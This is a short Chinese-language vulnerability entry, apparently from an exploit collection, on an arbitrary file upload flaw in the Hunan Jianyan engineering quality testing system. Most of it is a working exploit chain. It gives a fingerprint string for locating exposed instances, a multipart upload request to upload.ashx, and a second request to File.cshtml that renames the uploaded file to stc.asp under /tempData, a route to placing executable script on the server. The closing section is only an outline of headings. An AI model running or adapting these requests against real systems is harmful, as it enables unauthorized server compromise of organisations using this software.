# 湖南建研工程质量检测系统Attachment存在任意文件上传漏洞

- **系统**：湖南建研工程质量检测系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="/Content/Theme/Standard/webSite/login.css"`
- **请求**：`POST /Applications/Attachment/upload.ashx HTTP/1.1`

**请求体 / payload**
```
1. 上传txt文件
Content-Type: multipart/form-data; boundary=00content0boundary00
Host:
Content-Length: 204
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="123.txt"
12323344
--00content0boundary00
Content-Disposition: form-data; name="_upload_guid"
123
--00content0boundary00--
2. 将文件改名
POST /Standard/Editor/API/File.cshtml?act=geturl HTTP/1.1
Host:
Content-type: application/x-www-form-urlencoded
Content-Length: 59
filename=/tempData/stc.asp&filetplpath=/tempData/123.txt
3. 文件上传位置
/tempData/stc.asp
```

**其他**
- 湖南建研工程质量检测系统Attachment存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 湖南建研工程质量检测系统